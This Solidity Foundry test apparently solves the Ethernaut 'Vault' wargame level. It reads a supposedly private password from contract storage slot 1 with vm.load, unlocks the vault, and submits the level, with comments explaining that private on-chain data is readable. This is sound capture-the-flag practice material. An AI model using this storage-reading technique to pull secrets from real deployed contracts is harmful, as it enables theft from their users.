// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/Ethernaut.sol";
import "../src/levels/08-VaultFactory.sol";

contract VaultHackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 wei);
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory factory = new VaultFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Vault vaultContract = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // All properties in a contract is accessible
        // To access private properties, we need to load it from an index in storage
        // In this case, we use `vm.load` to load storage property at index 1 (bytes32 password).
        // Once loaded, we can use it to `unlock`
        bytes32 password = vm.load(address(vaultContract), bytes32(uint256(1)));
        string memory passwordText = string(abi.encodePacked(password));
        emit log_string(passwordText);
        vaultContract.unlock(password);
        assertFalse(vaultContract.locked());

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
